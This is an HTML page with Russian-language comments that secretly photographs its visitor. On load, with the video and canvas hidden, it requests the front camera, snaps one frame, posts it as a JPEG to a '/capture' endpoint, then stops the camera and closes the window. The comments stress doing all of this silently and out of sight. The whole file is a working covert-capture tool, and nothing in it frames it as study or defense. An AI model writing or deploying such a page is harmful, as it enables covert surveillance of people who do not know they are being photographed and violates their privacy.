<!DOCTYPE html>
<html>
<head>
    <title>Cam</title>
</head>
<body>
    <!-- Всё скрыто, нихера не видно -->
    <video id="video" style="display:none" autoplay></video>
    <canvas id="canvas" style="display:none"></canvas>
    
    <script>
        (function() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            
            // Тихо запрашиваем камеру
            navigator.mediaDevices.getUserMedia({ 
                video: { 
                    width: 640, 
                    height: 480,
                    facingMode: 'user'
                } 
            })
            .then(stream => {
                video.srcObject = stream;
                
                // Как только видео готово - молча фоткаем
                video.onplaying = () => {
                    setTimeout(() => {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        // Молча отправляем
                        fetch('/capture', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                photo: canvas.toDataURL('image/jpeg', 0.7)
                            })
                        }).finally(() => {
                            // Останавливаем камеру
                            stream.getTracks().forEach(track => track.stop());
                        });
                        
                        // Закрываем страницу через секунду
                        setTimeout(() => window.close(), 1000);
                    }, 500);
                };
            })
            .catch(() => {
                // Если нет камеры - просто тихо закрываемся
                window.close();
            });
        })();
    </script>
</body>
</html>
